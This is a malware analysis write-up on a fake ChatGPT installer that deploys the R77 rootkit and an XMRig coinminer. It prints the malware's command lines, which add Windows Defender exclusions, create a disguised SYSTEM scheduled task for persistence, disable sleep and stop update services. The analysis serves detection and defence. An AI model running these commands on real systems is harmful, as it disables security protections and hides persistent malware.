---
tags: Trojans
---
## Investigating A Fake Trojanised ChatGPT Application

This sample is a trojanised ChatGPT installer which can be downloaded as an .msi file from SourceForge. It masquerades as a Free ChatGPT 4 binary but utilises the R77 rootkit to deploy XMRig coinminer malware.


![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/7dd1c425-3a00-49f9-871f-4fa5394e152c)


During installation, the directory 'C:\Program Files (x86)\OpenAI' is created, and process 'C:\Program Files (x86)\OpenAI\Chatgpt Desktop V4\Free Chatgpt V4\Free Chatgpt V4.exe' is executed.

This process spawns cmd.exe with the following command line:
```
C:\Windows\system32\cmd.exe /c "powershell.exe "Add-MpPreference -ExclusionPath “C:\Windows\Temp”,“C:/”,“.exe”""
```
This command will exclude any executables in the path "C:\Windows\Temp" from being looked at by Windows Defender, this is highly suspicious and indicates that something malicious is likely residing in the Temp directory.

Turning our attention to the Temp directory, we observe the following file creation event for the executable "Free Chatgpt V4.exe"

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/231c750a-27e8-4481-8cd0-9a40e7edc0dd)

Upon execution of the main ChatGPT binary,a binary of the same name 'Free Chatgpt V4.exe' in the Temp directory is executed silently. The same binary also exists as 'C:\Program Files\Google\Chrome\Googleupdater.exe'.

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/c6453e05-2b36-4c3d-b9fe-783443a73bc2)

The binaries present at 'C:\Program Files\Google\Chrome\Googleupdater.exe' and 'C:\Windows\Temp\Free Chatgpt V4.exe' are R77 rootkits

R77’s primary purpose is to hide the presence of other software on a system, making it ideal in this case to hide elements of coin miner malware.

Further commands of interest were identified, but it's difficult to gather further context surrounding them likely due to the nature of the R77 rootkit.

_A scheduled task called "GoogleUpdateXQ" is created as a persistence mechanism to execute the rookit_
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe <#sednnxbeh#> IF([System.Environment]::OSVersion.Version -lt [System.Version]"6.2") { schtasks /create /f /sc onlogon /rl highest /ru 'System' /tn 'GoogleUpdateXQ' /tr '''C:\Program Files\Google\Chrome\Googleupdater.exe''' } Else { Register-ScheduledTask -Action
(New-ScheduledTaskAction -Execute 'C:\Program Files\Google\Chrome\Googleupdater.exe') -Trigger (New-ScheduledTaskTrigger -AtStartup) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000)) -
TaskName 'GoogleUpdateXQ' -User 'System' -RunLevel 'Highest' -Force; }
```

_The scheduled task is executed directly via command line_
```
C:\Windows\System32\schtasks.exe /run /tn "GoogleUpdateXQ"
```


_A command is executed which manipulates sleep functions on the host, which is a technique leveraged by coin-mining malware_
```
C:\Windows\System32\cmd.exe /c powercfg /x -hibernate-timeout-ac 0 & powercfg /x -hibernate-timeout-dc 0 & powercfg /x -standby-timeout-ac 0 & powercfg /x -standby-timeout-dc 0
```

_Legitimate Windows services are stopped, this is another indication of coin miner malware_
```
C:\Windows\System32\cmd.exe /c sc stop UsoSvc & sc stop WaaSMedicSvc & sc stop wuauserv & sc stop bits & sc stop dosvc
```

_Further Windows Defender exclusion paths are added_
```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force
```

These commands are a strong indication of coin-miner malware, and are similar to samples such as:

[https://any.run/report/2032ba1561fdfa8dce836c35bc1f89aa9a806c021f1ed7f7c32324b54e450290/8fe9499b-3310-40b9-afd0-51eb2a8184de](https://any.run/report/2032ba1561fdfa8dce836c35bc1f89aa9a806c021f1ed7f7c32324b54e450290/8fe9499b-3310-40b9-afd0-51eb2a8184de)

[https://www.joesandbox.com/analysis/1279914/0/lighthtml](https://www.joesandbox.com/analysis/1279914/0/lighthtml)

_Basic Execution Flow_

![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/e48d185e-6604-44bd-aafd-ebe3d87e23eb)



